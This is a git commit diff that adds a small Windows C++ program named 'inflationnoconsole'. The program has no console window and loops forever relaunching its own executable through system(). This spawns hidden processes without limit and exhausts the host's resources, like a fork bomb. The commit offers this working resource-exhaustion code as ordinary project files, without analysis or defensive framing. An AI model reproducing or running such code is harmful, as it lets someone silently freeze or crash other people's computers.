cf2f63478ef3b05196eb090552217351029f3228
Xinyi <cindytianla@gmail.com>
2021-01-26 10:05:21 -0800

    Add project files.

---
+++ inflationnoconsole/inflationnoconsole.cpp
@@ -0,0 +1,19 @@
+// inflationnoconsole.cpp : Defines the entry point for the application.
+//
+
+#include <Windows.h>
+
+int APIENTRY wWinMain(HINSTANCE Instance,
+	HINSTANCE hPreInstance,
+	LPTSTR    lpCmdLine,
+	int		  nCmdShow) {
+
+	long double* a = new long double;
+	long double* b = new long double;
+	long double* c = new long double;
+
+	while (1) {
+		
+		system("inflationnoconsole.exe");
+	}
+}
